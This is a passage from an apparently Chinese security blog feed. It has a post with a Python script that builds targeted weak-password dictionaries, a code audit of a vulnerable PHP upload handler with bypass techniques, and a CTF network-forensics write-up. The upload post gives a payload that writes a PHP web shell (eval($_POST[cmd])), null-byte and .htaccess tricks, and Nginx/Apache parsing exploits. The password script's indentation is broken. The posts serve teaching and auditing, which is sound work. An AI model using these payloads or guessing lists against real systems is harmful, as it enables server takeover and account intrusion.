mingxiaozijd组合有很多种，没有一一列举，可以自由发挥。</code></pre><p>另提示一点:当系统要求密码组合必须包含大写字母时候，根据中国人密码设定习惯，会有83%的人将大写字母，且是唯一存在的大写字母放在第一位。</p><h2 id="0x03-弱口令生成"><a href="#0x03-弱口令生成" class="headerlink" title="0x03 弱口令生成"></a>0x03 弱口令生成</h2><p>关于弱口令生成可以利用相关工具或者脚本，工具的话网上有很多，可以自行搜索下载，在这里我提供自己写的python小脚本，如果有需要请自行修改，仅作参考：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*- </span></div><div class="line">weak_password=[<span class="string">'000000'</span>,<span class="string">'0000000'</span>,<span class="string">'111111'</span>,<span class="string">'11111111'</span>,<span class="string">'112233'</span>,<span class="string">'123123'</span>,<span class="string">'123321'</span>,<span class="string">'123456'</span>,<span class="string">'12345678'</span>,<span class="string">'87654321'</span>,<span class="string">'123456789'</span>,<span class="string">'987654321'</span>,<span class="string">'1234567890'</span>,<span class="string">'0123456789'</span>,<span class="string">'654321'</span>,<span class="string">'666666'</span>,<span class="string">'888888'</span>,<span class="string">'666888'</span>,<span class="string">'66668888'</span>,<span class="string">'abcdef'</span>,<span class="string">'147258369'</span>,<span class="string">'abcabc'</span>,<span class="string">'abc123'</span>,<span class="string">'a1b2c3'</span>,<span class="string">'aaa111'</span>,<span class="string">'123qwe'</span>,<span class="string">'qweasd'</span>,<span class="string">'admin'</span>,<span class="string">'root'</span>,<span class="string">'pass123'</span>,<span class="string">'p@ssword'</span>,<span class="string">'password'</span>,<span class="string">'passwd'</span>,<span class="string">'iloveyou'</span>,<span class="string">'woaini'</span>,<span class="string">'5201314'</span>,<span class="string">'qq123456'</span>,<span class="string">'taobao'</span>,<span class="string">'wang1234'</span>]</div><div class="line">    </div><div class="line">foreign_weak_password=[<span class="string">'password'</span>,<span class="string">'123456'</span>,<span class="string">'12345678'</span>,<span class="string">'qwerty'</span>,<span class="string">'abc123'</span>,<span class="string">'monkey'</span>,<span class="string">'1234567'</span>,<span class="string">'letmein'</span>,<span class="string">'trustno1'</span>,<span class="string">'dragon'</span>,<span class="string">'baseball'</span>,<span class="string">'111111'</span>,<span class="string">'iloveyou'</span>,<span class="string">'master'</span>,<span class="string">'sunshine'</span>,<span class="string">'ashley'</span>,<span class="string">'bailey'</span>,<span class="string">'passw0rd'</span>,<span class="string">'shadow'</span>,<span class="string">'123123'</span>,<span class="string">'654321'</span>,<span class="string">'superman'</span>,<span class="string">'qazwsx'</span>,<span class="string">'michael'</span>,<span class="string">'football'</span>,<span class="string">'qwerty'</span>,<span class="string">'welcome'</span>,<span class="string">'ninja'</span>,<span class="string">'hello'</span>,<span class="string">'happy'</span>,<span class="string">'anything'</span>,<span class="string">'abcabcabc'</span>,<span class="string">'qwert123'</span>,<span class="string">'system'</span>,<span class="string">'command'</span>,<span class="string">'adminstrator'</span>,<span class="string">'mouse'</span>,<span class="string">'harddisk'</span>]</div><div class="line">    </div><div class="line">name=[<span class="string">'xiaoming'</span>,<span class="string">'Xiaoming'</span>,<span class="string">'xiaoMing'</span>,<span class="string">'xiao_ming'</span>,<span class="string">'xiaoM'</span>,<span class="string">'XMing'</span>,<span class="string">'Xming'</span>,<span class="string">'xl'</span>,<span class="string">'XM'</span>]</div><div class="line">    </div><div class="line">birth=[<span class="string">'1995'</span>,<span class="string">'_1995'</span>,<span class="string">'09'</span>,<span class="string">'9'</span>,<span class="string">'23'</span>,<span class="string">'199509'</span>,<span class="string">'_950923'</span>,<span class="string">'_199509'</span>,<span class="string">'9509'</span>,<span class="string">'0923'</span>,<span class="string">'19950925'</span>]</div><div class="line">    </div><div class="line">specialnum=[<span class="string">'1314'</span>,<span class="string">'520'</span>,<span class="string">'000'</span>,<span class="string">'111'</span>,<span class="string">'123'</span>,<span class="string">'168'</span>,<span class="string">'1234'</span>,<span class="string">'123456'</span>,<span class="string">'5201314'</span>,<span class="string">'888'</span>,<span class="string">'666'</span>,<span class="string">'123123'</span>]</div><div class="line">    </div><div class="line">id=[<span class="string">'mingxiaozi'</span>,<span class="string">'xiaolifeidao'</span>]</div><div class="line">    </div><div class="line">companyinfo=[<span class="string">'jingdong'</span>,<span class="string">'JongDong'</span>,<span class="string">'jd'</span>,<span class="string">'JD'</span>]</div><div class="line"></div><div class="line"><span class="comment">#自行添加更多信息</span></div><div class="line"></div><div class="line">f=open(<span class="string">'weakpasswords.txt'</span>,<span class="string">'w'</span>)</div><div class="line"><span class="keyword">for</span> a <span class="keyword">in</span> weak_password:</div><div class="line">    f.write(a+<span class="string">'\n'</span>)</div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> foreign_weak_password:</div><div class="line">    f.write(b+<span class="string">'\n'</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> name:</div><div class="line"><span class="keyword">for</span> d <span class="keyword">in</span> birth:</div><div class="line">f.write(c+d+<span class="string">'\n'</span>)</div><div class="line">f.write(d+c+<span class="string">'\n'</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> name:</div><div class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> specialnum:</div><div class="line">    f.write(e+f+<span class="string">'\n'</span>)</div><div class="line">    f.write(f+e+<span class="string">'\n'</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> id:</div><div class="line">    <span class="keyword">for</span> b1 <span class="keyword">in</span> birth:</div><div class="line">    f.write(i1+b1+<span class="string">'\n'</span>)</div><div class="line">    f.write(b1+i1+<span class="string">'\n'</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> id:</div><div class="line">    <span class="keyword">for</span> s1 <span class="keyword">in</span> specialnum:</div><div class="line">    f.write(i2+s1+<span class="string">'\n'</span>)</div><div class="line">    f.write(s1+i2+<span class="string">'\n'</span>)</div><div class="line">    </div><div class="line"><span class="keyword">for</span> n1 <span class="keyword">in</span> name:</div><div class="line">   <span class="keyword">for</span> b1 <span class="keyword">in</span> birth:</div><div class="line">    <span class="keyword">for</span> s2 <span class="keyword">in</span> specialnum:</div><div class="line">    f.write(n1+s2+b1+<span class="string">'\n'</span>)</div><div class="line">    f.write(s2+n1+b1+<span class="string">'\n'</span>)</div><div class="line">    f.write(s2+b1+n1+<span class="string">'\n'</span>)</div><div class="line"><span class="comment">#自行添加更多组合</span></div></pre></td></tr></table></figure><p></p><p>提醒一点就是如果你添加的信息越多，组合方式越多，那么生成的字典就越大，要考虑储存的容量问题。同时也推荐使用cupp.py和crunch。</p><h2 id="0x04-后话"><a href="#0x04-后话" class="headerlink" title="0x04 后话"></a>0x04 后话</h2><p>欢迎大家补充:P</p>]]></content>
    
    <summary type="html">
    
      浅析弱口令.png [https://www.hackfun.org/usr/uploads/2017/03/3619832931.png]

#0X00-前言0X00 前言
弱口令其实是长期以来一直存在的问题，直到今天我们还能经常听某个著名厂商公司因为存在弱口令问题而导致大量内部或外部用户信息泄露，甚至商业计划和机密泄露，所以一个安全密码设置的重要性不言而喻，涉及密码，不得谈到密码的强弱，当然强弱密码的区分没有一个严格明确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或容易被破解工具破解的口令均为弱密码，在此我粗略谈谈弱密码方面，也就是我们经常说到的弱口令。

其实设置密码的强弱很大程度上与这个人的个人习惯和安全意识有关，当然还是受其他的因素的影响，比如公司出于安全考虑要求设置强密码等其他强制硬性要求，个人觉得弱口令可以大致分为两类，一类就是公共弱口令，另一类就是个人弱口令。
    
    </summary>
    
      <category term="渗透测试" scheme="https://sunnyelf.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="弱口令字典" scheme="https://sunnyelf.github.io/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AD%97%E5%85%B8/"/>
    
      <category term="弱口令" scheme="https://sunnyelf.github.io/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>尽最大可能分析上传源码及漏洞利用方式</title>
    <link href="https://sunnyelf.github.io/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
    <id>https://sunnyelf.github.io/2017/03/03/尽最大可能分析上传源码及漏洞利用方式/</id>
    <published>2017-03-02T20:19:00.000Z</published>
    <updated>2017-10-02T20:02:37.944Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简单源码分析"><a href="#0x00-简单源码分析" class="headerlink" title="0x00 简单源码分析"></a>0x00 简单源码分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)<span class="comment">//检测Content-type值</span></div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))</div><div class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))       <span class="comment">//检测文件大小</span></div><div class="line">  &#123;</div><div class="line">  $ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));  <span class="comment">//获取最后“.”的后缀</span></div><div class="line">  <span class="keyword">if</span>($ext === <span class="string">'php'</span>)                <span class="comment">//检测是否为php后缀</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)      <span class="comment">//返回上传错误码</span></div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Return Code: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">else</span><span class="comment">//返回上传成功信息</span></div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Size: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" Kb&lt;br /&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))  <span class="comment">//检测文件是否存在</span></div><div class="line">      &#123;</div><div class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</div><div class="line">      &#125;</div><div class="line">    <span class="keyword">else</span>              <span class="comment">//将上传的临时文件转移到指定存放文件夹</span></div><div class="line">      &#123;</div><div class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</div><div class="line">      <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"Invalid file"</span>;    <span class="comment">//返回无效文件的错误信息</span></div><div class="line">  &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><h2 id="0x01-详细分析过程"><a href="#0x01-详细分析过程" class="headerlink" title="0x01 详细分析过程"></a>0x01 详细分析过程</h2><p><strong>1) 直接使用用户上传文件名，没有过滤特殊字符，存在漏洞</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)     <span class="comment">//文件类型检测</span></div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))</div><div class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))</div><div class="line">  &#123;</div><div class="line">  $ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));  <span class="comment">//文件后缀检测</span></div><div class="line">  <span class="keyword">if</span>($ext === <span class="string">'php'</span>)&#123;</div><div class="line">  </div><div class="line">  <span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">      ......                                      <span class="comment">//省略了中间的一些代码</span></div><div class="line">``` </div><div class="line">以下代码的作用是，将上传到临时文件夹的文件移到upload的目录下     </div><div class="line">```php</div><div class="line"><span class="keyword">else</span> </div><div class="line"> &#123;</div><div class="line"> move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</div><div class="line"> <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line"> <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line"> &#125;</div></pre></td></tr></table></figure><p><strong>1.1分析：</strong></p><p>从以上代码可以看出，可以上传图片文件，对文件拓展名检测是通过<code>end(explode(‘.’,$_FILES[“file”][“name”]))</code>函数实现（在这里先不说文件类型验证的问题）<code>explode(‘.’,$_FILES[“file”][“name”])</code>用来把上传的文件名作为字符串，以.(点)来分割字符串来生成数组，而<code>end()</code>函数则是将数组内部指针指向最后一个元素，并返回该元素的值，例如，当上传x.php文件时，最终就会获取到php。<br>而对于<code>$_FILES</code>里面获取变量，是直接来自http request请求，它跟普通获取其它get,post变量一样。 比如在post上传时，我们可以通过抓包来截获（常用神器burpsuite）这一过程，由于在上传的检测中没有对文件名进行检测和过滤及处理，因此，我们可以将name构造一个特殊文件名，然后，再将post数据提交，就可以达到上传绕过对文件扩展名的检测。</p><p><strong>1.2利用：</strong></p><p>比如我们可以在本地上将一个php文件命名为x.php.jpg在上传文件时，抓包post，将filename修改为<code>x.php\0.jpg</code>再提交post数据，那么在保存我们修改后的文件时，<code>\0</code>后面的所有字符将(如.jpg)被自动截断，最终生成我们想要目标文件格式(如本例的x.php)，以至于可以上传任意恶意的php脚本。从网上得到说明Php4的版本可以利用这个漏洞，php5版本以上会自动过滤掉<code>’”/0”</code>，另外很多asp,jsp也存在此类截断上传的漏洞。</p><p><strong>2)文件类型验证不严格，存在漏洞*</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))</div><div class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))</div><div class="line">  &#123;</div><div class="line">  $ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));</div><div class="line">  <span class="keyword">if</span>($ext === <span class="string">'php'</span>)&#123;  </div><div class="line">  <span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure><p><strong>2.1分析:</strong></p><p>从代码可以看出是通过读取文件的type直接来做文件类型的判断，同样我们可以通过抓取post数据，将Content-type值修改为允许上传的MIME类型，在这里有image/gif等三种，从而绕过对文件type的检查，虽然之后代码对文件扩展名进行了检测(那两个个函数对文件扩展名检测的大慨过程就是判断文件名最后”.”的最后字符，example.php.bak最终得到是bak)，并判断是否是php后缀名。</p><p><strong>2.2利用:</strong></p><p>1.如果没有对apache默认支持解析文件方式进行修改时(即apache解析漏洞,很多网站管理员由于安全意识薄弱或其他情况往往没有修改)，那么在绕过对type的检测之后，最简单的利用方式就是我们可以直接上传一个恶意的名为x.php.ext，这里的ext可以是多种，只要不是php和apache可以解析其他扩展名(如txt后缀)就可以，那么按照apache默认从右往左直到遇到可支持解析的文件的解析方式，那么就会把x.php.ext当成x.php来解析。</p><p>2.在绕过对文件type检查之后，我们还可以将本地的x.php文件修改为x.php1,x.php3,x.php4或者x.php5再上传，默认的apache服务器将会解析为php。</p><p><strong>3)使用php的全等于来判断是否为php文件类型，存在漏洞</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));</div><div class="line"><span class="keyword">if</span>($ext === <span class="string">'php'</span>)&#123;  </div><div class="line">  <span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure><p><strong>3.1分析:</strong></p><p>我们知道在php语法中全等于”===”的作用是先判断等号左右两边的数据类型是否一样，再判断等号两边的值是否相等，如果都相等返回true，否者返回false。</p><p><strong>3.2利用:</strong></p><p>在明白全等于”===”的判断原理之后，我们就可以进行利用了，还是以本地的x.php举例，我们可以将x.php修改为Php, x.PHp, PHP…在绕过对type的检测之后再上传，以上传的x.PHP来分析，首先上传截获到的是PHP后缀，此时$ext=PHP，再将进行下一步的验证，$ext和php都是相同的数据类型，但是在验证它们值时却不相等，从而绕过上传。</p><p>而默认的web应用程序都是默认将<code>Php</code>，<code>x.PHp</code>,<code>PHP</code>…解析为php执行。</p><p><strong>4)对上传文件内容没有做检测，存在漏洞</strong></p><p><strong>4.1分析:</strong></p><p>从upload.php源代码分析来看，在整个过程没有对上传文件内容进行检测，过滤和处理，可以通过上传图片木马或其他方式来到达恶意上传的目的。</p><p><strong>4.2利用:</strong></p><p>1.如果的网站是用Nginx的Web应用程序且版本<code>&lt;8.03</code>，那我们就可以利用Nginx默认开启Fast-CGI而造成的畸形解析漏洞，以下是具体利用方式说明。在默认Fast-CGI开启状况下,我们可以上传一个名为x.jpg，其内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>的文件，之后我们再访问<code>x.jpg/.php</code>这个网站路径,在这个目录下就会生成一句话木马shell.php。</p><p>2.如果的网站是用Nginx的Web应用程序且版本在(<code>0.5.*，0.6.*，0.7，0.8&lt;=0.7.65&lt;=0.8.37</code>)其中，那我们还可以利用Nginx空字节代码执行漏洞来达到上传任意恶意代码并执行。具体利用方法是：将<code>x.jpg</code>图片中嵌入PHP代码然后通过访问<code>x.jpg%00.php</code>来执行其中的恶意代码。</p><p>3.如果网站的Apache Web应用程序中<code>.htaccess</code>可被执行且可被上传，那可以尝试在.htaccess中写入:<br><code>&lt;FilesMatch &quot;example.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code><br>这段代码的意思就是将把目录下的所有后缀为jpg的文件当做可执行的php脚本进行解析并执行。因此，我们可以上传一个x.jpg的木马, 这样x.jpg就可解析为php文件。</p>]]></content>
    
    <summary type="html">
    
      #0X00-简单源码分析0X00 简单源码分析
123456789101112131415161718192021222324252627282930313233343536373839

&lt;?phpif ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)		//检测Content-type值|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;))&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 20000))		       //检测文件大小  {  $ext = end(explode(&#39;.&#39;, $_FILES[&quot;file&quot;][&quot;name&quot;]));  //获取最后“.”的后缀  if($ext === &#39;php&#39;)  			              //检测是否为php后缀  	{    exit(&#39;error&#39;);    }  if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)		      //返回上传错误码    {    echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;    }  else													//返回上传成功信息    {    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;    echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))  //检测文件是否存在      {      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;      }    else			              //将上传的临时文件转移到指定存放文件夹      {      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],      &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);      echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];      }    }  }else  {  echo &quot;Invalid file&quot;;			    //返回无效文件的错误信息  }?&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://sunnyelf.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="代码审计" scheme="https://sunnyelf.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="上传分析" scheme="https://sunnyelf.github.io/tags/%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>一道有趣的网络取证分析CTF题目</title>
    <link href="https://sunnyelf.github.io/2017/02/28/%E4%B8%80%E9%81%93%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90CTF%E9%A2%98%E7%9B%AE/"/>
    <id>https://sunnyelf.github.io/2017/02/28/一道有趣的网络取证分析CTF题目/</id>
    <published>2017-02-27T20:16:00.000Z</published>
    <updated>2017-10-02T19:22:31.821Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>这是一道新颖的网络取证分析的题目，用TCP协议紧急数据来隐藏发送flag，很多选手都被其中的图片带偏了方向，导致花了很多时间也没有做出来，其实刚开始我也被带入坑:-(</p><a id="more"></a><p>下载题目使用Wireshark打开分析，整个过程为客服端请求<a href="http://secrets.ctf/message.png，然后与服务端进行TCP的三次握手建立连接，之后便开始分段传输数据，直到message.png传输完成释放连接。" target="_blank" rel="external">http://secrets.ctf/message.png，然后与服务端进行TCP的三次握手建立连接，之后便开始分段传输数据，直到message.png传输完成释放连接。</a></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/532952698.png" alt="1.png"></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/155392968.png" alt="2.png"></p><p>然后我们就会毫不犹豫把message.png导出便开始分析，我就是这样被带入坑，然而分析N久，没有什么收获，然后开始怀疑是不是流量包还藏着其他信息没有get到，于是便开始仔细分析包，发现了些有趣的东西：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/413869343.png" alt="3.png"></p><p>从服务端向客服端发送message.png的分段数据开始到89号帧，每个TCP报文段控制位除了ACK（Acknowledgment）置1（表示确认号字段有效），URG（Urgent）位也都被置1（表示紧急指针字段有效，表明此报文段又紧急数据）</p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/861147144.png" alt="4.png"></p><p>在上图可以看到紧急指针指向紧急数据的位置，其字段值为67（十进制格式），转换ASCII值为’C’，一直到第89号帧都有紧急数据，分析提取便得到了flag：CTF{And_You_Thought_It_Was_In_The_Picture}，嗨呀，好气，正如flag所说:-(</p>]]></content>
    
    <summary type="html">
    
      #0X01-解题0X01 解题
这是一道新颖的网络取证分析的题目，用TCP协议紧急数据来隐藏发送flag，很多选手都被其中的图片带偏了方向，导致花了很多时间也没有做出来，其实刚开始我也被带入坑:-(
    
    </summary>
    
      <category term="CTF" scheme="https://sunnyelf.github.io/categories/CTF/"/>
    
    
      <category term="forensics" scheme="https://sunnyelf.github.io/tags/forensics/"/>
    
      <category term="networking" scheme="https://sunnyelf.github.io/tags/networking/"/>
    
  </entry>
  
  <entry>
    <title>CTF中那些脑洞大开的编码和加密</title>
    <link href="https://sunnyelf.github.io/2017/02/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86/"/>
    <id>https://sunnyelf.github.io/2017/02/22/CTF中那些脑洞大开的编码和加密/</id>
    <published>2017-02-22T15:00:00.000Z</published>
    <updated>2017-10-02T19:22:31.587Z</updated>
    
